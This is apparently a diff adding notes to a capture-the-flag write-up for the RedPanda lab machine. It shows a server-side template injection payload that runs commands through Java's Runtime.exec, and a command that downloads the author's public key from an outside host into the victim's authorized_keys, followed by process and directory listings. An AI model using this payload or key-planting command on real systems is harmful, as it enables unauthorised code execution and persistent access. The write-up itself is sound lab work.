@@ -462,7 +462,104 @@ which gets us to..
 awwwwwww yeah.
 
 
+now to pop a shell. this is a pain.
 
+2 minor modifications to `ssti-skel.py`, and
+```
+$ gd
+diff --git a/ssti-skel.py b/ssti-skel.py
+index ab1d2d1..f6c7661 100644
+--- a/ssti-skel.py
++++ b/ssti-skel.py
+@@ -36,7 +36,7 @@ class Terminal(Cmd):
+                for i in command:
+                        decimals.append(str(ord(i)))
+
+-               payload='''${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
++               payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
+
+
+                for i in decimals[1:]:
+@@ -63,7 +63,7 @@ class Terminal(Cmd):
+                headers = {} #This usually has to be added but there is a Burp extension to convert burp headers into python request headers.
+                debug('Headers: ',str(headers))
+                try:
+-                       response=requests.get(url, headers=headers)
++                       response=requests.post(url, headers=headers)
+                        output=response.text
+                        #The next line is used to parse out the output, this might be clean but it also may need work. Depends on the vuln.
+
+
+```
+
+
+```
+[21:20:41] ==> mkdir /home/woodenk/.ssh
+[21:20:41] ==> ls -la /home/woodenk/.ssh
+[21:20:41] ==> curl http://10.10.14.9:8000/redpanda.pub -o /home/woodenk/.ssh/authorized_keys
+```
+
+and..
+
+```
+$ ssh -l woodenk -i redpanda redpanda.htb
+Warning: Permanently added 'redpanda.htb,10.10.11.170' (ECDSA) to the list of known hosts.
+woodenk@redpanda.htb's password:
+```
+
+even after making it `0600`, and `chgrp woodenk`, still no love
+
+ok, sticking with this shell for now.
+
+```
+[21:20:41] ==> ps aux
+root         611  0.0  0.8 214660 17996 ?        SLsl Jul16   0:08 /sbin/multipathd -d -s
+systemd+     632  0.0  0.2  90872  6088 ?        Ssl  Jul16   0:06 /lib/systemd/systemd-timesyncd
+root         647  0.0  0.5  47540 10712 ?        Ss   Jul16   0:00 /usr/bin/VGAuthService
+root         649  0.0  0.4 311504  8404 ?        Ssl  Jul16   1:24 /usr/bin/vmtoolsd
+root         664  0.0  0.2  99896  5744 ?        Ssl  Jul16   0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
+root         683  0.0  0.4 239292  9328 ?        Ssl  Jul16   0:01 /usr/lib/accountsservice/accounts-daemon
+message+     684  0.0  0.2   7380  4432 ?        Ss   Jul16   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+root         707  0.0  0.1  81956  3852 ?        Ssl  Jul16   0:03 /usr/sbin/irqbalance --foreground
+root         708  0.0  0.4 236436  9072 ?        Ssl  Jul16   0:00 /usr/lib/policykit-1/polkitd --no-debug
+syslog       716  0.0  0.2 224344  5136 ?        Ssl  Jul16   0:00 /usr/sbin/rsyslogd -n -iNONE
+root         722  0.0  0.2  17124  5932 ?        Ss   Jul16   0:00 /lib/systemd/systemd-logind
+root         726  0.0  0.6 395484 13548 ?        Ssl  Jul16   0:00 /usr/lib/udisks2/udisksd
+root         749  0.0  0.6 318816 13448 ?        Ssl  Jul16   0:00 /usr/sbin/ModemManager
+systemd+     813  0.0  0.6  24696 13128 ?        Ss   Jul16   0:10 /lib/systemd/systemd-resolved
+root         856  0.0  0.1   6812  3056 ?        Ss   Jul16   0:00 /usr/sbin/cron -f
+root         860  0.0  0.1   8356  3356 ?        S    Jul16   0:00 /usr/sbin/CRON -f
+daemon       861  0.0  0.1   3792  2300 ?        Ss   Jul16   0:00 /usr/sbin/atd -f
+root         862  0.0  0.0   2608   592 ?        Ss   Jul16   0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+root         863  0.0  0.2   9420  4588 ?        S    Jul16   0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+root         869  0.0  0.3  12172  7336 ?        Ss   Jul16   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+woodenk      871  0.2 13.0 3112828 265508 ?      Sl   Jul16   3:12 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
+root         882  0.0  0.0   5828  1848 tty1     Ss+  Jul16   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
+mysql        912  0.1 21.7 1819240 442252 ?      Ssl  Jul16   2:48 /usr/sbin/mysqld
+root        1742  0.0  0.0      0     0 ?        I    Jul16   0:23 [kworker/0:0-events]
+root       12297  0.0  0.0      0     0 ?        I    10:28   0:27 [kworker/0:1-events]
+root       17359  0.0  0.0      0     0 ?        I    16:39   0:02 [kworker/1:2-events]
+root       20591  0.0  0.0      0     0 ?        I    20:23   0:00 [kworker/u4:0-events_power_efficient]
+root       21104  0.0  0.0      0     0 ?        I    21:00   0:00 [kworker/u4:1-events_power_efficient]
+root       21253  0.0  0.0      0     0 ?        I    21:10   0:00 [kworker/1:1-events]
+root       21526  0.0  0.0      0     0 ?        I    21:28   0:00 [kworker/u4:2-events_power_efficient]
+woodenk    21529  0.0  0.1   8888  3248 ?        R    21:28   0:00 ps aux
+```
+
+grab the jar and reverse it?
+
+```
+[21:20:41] ==> ls -la /opt
+drwxr-xr-x  5 root root 4096 Jun 23 18:12 .
+drwxr-xr-x 20 root root 4096 Jun 23 14:52 ..
+-rwxr-xr-x  1 root root  462 Jun 23 18:12 cleanup.sh
+drwxr-xr-x  3 root root 4096 Jun 14 14:35 credit-score
+drwxr-xr-x  6 root root 4096 Jun 14 14:35 maven
+drwxrwxr-x  5 root root 4096 Jun 14 14:35 panda_search
+</h2>
+```
+
+hmm - is `credit-score` another site? what's `cleanup.sh`?
 
 ## flag
 
